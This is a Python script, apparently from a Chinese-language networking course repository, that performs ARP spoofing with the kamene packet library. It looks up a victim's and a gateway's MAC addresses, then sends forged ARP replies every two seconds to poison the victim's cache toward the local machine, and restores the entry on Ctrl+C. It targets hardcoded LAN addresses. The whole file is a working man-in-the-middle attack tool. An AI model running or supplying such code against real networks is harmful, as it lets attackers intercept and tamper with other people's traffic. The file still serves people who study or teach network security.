#!/usr/bin/python3
# _*_ coding=utf-8 _*_
# python basic scripts
import logging
logging.getLogger("kamene.runtime").setLevel(logging.ERROR)  #清除报错
from kamene.all import *
from my_python_classic_protocol.Chapter01_ARP.ARP_Request import arp_request
from my_python_classic_protocol.my_Tools.GET_IP import get_ip_address
from my_python_classic_protocol.my_Tools.GET_MAC import GET_MAC
from my_python_classic_protocol.my_Tools.GET_IFACE_NAME import get_ifname
import time
import signal

def arp_spoof(ip_1, ip_2, ifname='ens160'):
    global localip, localmac, ip_1_mac, ip_2_mac, g_ip_1, g_ip_2, g_ifname   #申明全局变量
    g_ip_1 = ip_1
    g_ip_2 = ip_2
    g_ifname = ifname

    localip = get_ip_address(ifname)

    localmac = GET_MAC(ifname)

    ip_1_mac = arp_request(ip_1, ifname)[1]  #通过arp_request获取攻击目标的真实mac地址

    ip_2_mac = arp_request(ip_2, ifname)[1]  #通过arp_request获取想要欺骗目标ARP条目的ip对应的mac地址（eg.网关地址)

    signal.signal(signal.SIGINT, sigint_handler)
    while True:   #一直攻击，直到ctrl+c出现！！
        sendp(Ether(src=localmac, dst=ip_1_mac) /ARP(op=2, hwsrc=localmac, hwdst=ip_1_mac, psrc=g_ip_2, pdst=g_ip_1),
              iface=get_ifname(g_ifname),
              verbose=False)
        print(f'发送ARP欺骗数据包！欺骗{ip_1}, 本机MAC为{ip_2} 的MAC地址！！')
        time.sleep(2)

def sigint_handler(signum, frame): #定义处理方法
    global localip, localmac, ip_1_mac, ip_2,mac, g_ip_1, g_ip_2, g_ifname   #引入全局变量
    print('\n执行恢复操作！')
    sendp(Ether(src=ip_2_mac, dst=ip_1_mac) / ARP(op=2, hwsrc=ip_2_mac, hwdst=ip_1_mac, psrc=g_ip_2, pdst=g_ip_1),
          iface=get_ifname(g_ifname),
          verbose=False)
    print(f'已经恢复 {g_ip_1} ARP绑存！')
    sys.exit()


if __name__ == '__main__':
    arp_spoof('10.159.202.220', '10.159.202.254', 'ens160')

    